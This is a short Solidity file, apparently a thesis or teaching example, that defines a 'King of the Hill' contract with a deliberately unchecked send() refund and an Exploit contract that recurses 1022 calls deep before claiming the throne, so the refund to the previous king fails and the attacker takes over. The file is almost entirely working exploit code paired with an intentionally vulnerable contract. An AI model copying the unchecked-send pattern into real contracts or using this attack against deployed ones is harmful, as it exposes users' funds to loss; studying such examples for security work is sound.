// own work
pragma solidity ^0.4.23;

contract KingOfTheBachelorThesis {
    struct King {
        string name;
        address refundAddress;
        uint value;
    }
    
    King public current = King({
        name: "Nobody",
        refundAddress: msg.sender,
        value: 1 ether
    });   

    function claim(string _name) public payable {
        require(msg.value > current.value);
        current.refundAddress.send(address(this).balance);
        
        current = King({
            name: _name,
            refundAddress: msg.sender,
            value: msg.value
        });
    }
}

contract Exploit {
    KingOfTheBachelorThesis victim;
    
    constructor (KingOfTheBachelorThesis _victim) {
        victim = _victim;
    }
    
    function attack() payable public {
        attackRecursion(1022);
    }
    
    function attackRecursion(uint depthLeft) internal {
        if (depthLeft == 0) {
            victim.claim.value(address(this).balance)("Evil king!");
        } else {
            attackRecursion(depthLeft - 1);
        }
    }
}
